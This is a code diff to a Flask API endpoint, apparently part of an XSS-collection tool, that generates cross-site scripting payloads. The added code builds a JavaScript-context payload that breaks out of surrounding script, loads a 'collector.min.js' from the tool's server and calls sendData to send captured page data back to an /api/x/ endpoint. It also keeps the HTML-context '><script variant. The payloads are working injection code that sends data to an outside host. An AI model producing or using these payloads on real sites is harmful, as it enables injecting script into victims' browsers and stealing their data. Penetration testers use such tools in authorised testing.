@@ -1,9 +1,10 @@
-from flask import jsonify, request
+from flask import jsonify, request, Response
 from app import db
 from app.models import Client, XSS
 from app.api import bp
 from flask_login import login_required, current_user
 
+import json
 
 @bp.route('/xss/generate/<id>', methods=['GET'])
 @login_required
@@ -63,11 +64,15 @@ def gen_xss(id):
 
 
     if i_want_it_all:
-        payload = """'>"><script src={}/static/collector.min.js></script><script>sendData('{}/api/x/{}/{}', '{}')</script>""".format(url, url, xss_type, uid, other_data)
-        return (payload), 200
+        if code_type == 'js':
+            payload = ';}};var js=document.createElement("script");js.src="{}/static/collector.min.js";js.onload=function(){{sendData("{}/api/x/{}/{}","{}")}};document.body.appendChild(js);'.format(url, url, xss_type, uid, other_data)
+            return (payload), 200
+        else:
+            payload = """'>"><script src={}/static/collector.min.js></script><script>sendData("{}/api/x/{}/{}", "{}")</script>""".format(url, url, xss_type, uid, other_data)
+            return (payload), 200
 
     if code_type == 'js':
-        payload = ';}; new Image().src="'
+        payload = ';};new Image().src="'
     else:
         payload = """'>">"""
         if require_js:
